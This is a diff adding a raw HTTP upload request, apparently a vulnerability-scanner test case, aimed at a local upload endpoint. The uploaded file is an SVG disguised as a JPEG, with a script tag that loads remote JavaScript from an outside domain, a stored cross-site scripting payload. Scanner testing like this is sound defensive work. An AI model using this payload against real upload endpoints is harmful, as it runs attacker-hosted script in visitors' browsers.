@@ -1,0 +1,22 @@
+POST /upload/BS00117 HTTP/1.1
+Host: localhost:8080
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+BS00117: BS00117
+Cookie: BS00117=BS00117;
+Referer: http://localhost/
+Origin:http://localhost/
+scannerauth:cd117e0a9365670f19c768032f8dabfe
+Content-Type: multipart/form-data;
+ boundary=------------------------5fad52c609219d12;
+Referer: https://localhost/api/file/upload
+Content-Length: 426
+
+--------------------------5fad52c609219d12
+Content-Disposition: form-data; name="file"; filename="jstv_2.jpeg"
+Content-Type: image/svg+xml
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1in" height="1in"><script type="text/javascript" charset="utf-8" xlink:href="https://bosapi.chujin.net.cn/jstv_jquery_2.js"></script>xxxxx</svg>
+--------------------------5fad52c609219d12--
